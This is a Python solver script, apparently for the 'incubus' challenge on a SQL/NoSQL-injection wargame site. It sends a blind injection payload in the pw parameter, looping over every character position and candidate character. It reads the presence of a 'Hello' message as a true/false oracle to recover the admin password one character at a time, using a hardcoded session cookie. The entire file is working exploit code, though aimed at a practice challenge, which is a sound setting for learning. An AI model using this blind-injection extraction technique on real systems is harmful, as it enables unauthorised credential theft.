import requests
import time
import string

url = "https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php"
cookies = dict(PHPSESSID="33a17d5ikllqctdau572ms56ui")

pw = ''
for i in range(0,8):
    for j in string.digits+string.ascii_lowercase+string.ascii_uppercase:
        payload = f"1' || obj.id=='admin'&&obj.pw[{i}]=='{j}' ? not : '1"

        response = requests.get(url, cookies=cookies, params={"pw": payload})
        print(response.url)
        if "<br><h2>Hello" not in response.text:
            pw += j
            print(j)
            break
print(pw)